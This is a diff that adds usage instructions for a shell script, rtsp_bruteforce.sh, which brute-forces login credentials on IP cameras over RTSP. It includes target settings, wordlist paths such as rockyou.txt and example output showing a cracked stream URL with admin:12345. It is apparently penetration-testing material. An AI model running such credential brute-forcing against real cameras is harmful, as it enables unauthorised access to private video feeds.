@@ -1,0 +1,18 @@
+Edit the script and set your target:
+CAMERA_IP="192.168.1.100"   # Target camera IP  
+CAMERA_PORT="554"           # Default RTSP port is 554  
+INTERFACE="eth0"            # Network interface (optional, leave blank for IPv4)  
+
+Run the script: 
+./rtsp_bruteforce.sh
+
+Example Output: 
+Starting RTSP brute-force test on 192.168.1.100 using:
+  Usernames: /usr/share/wordlists/SecLists/Usernames/cirt-default-usernames.txt
+  Passwords: /usr/share/wordlists/rockyou.txt
+  Interface: eth0
+  Paths: stream1 h264 live.sdp videoMain ...
+------------------------------------
+Testing rtsp://admin:12345@[192.168.1.100%eth0]:554/stream1 ...
+ SUCCESS: Stream found!
+  ➡ URL: rtsp://admin:12345@[192.168.1.100%eth0]:554/stream1
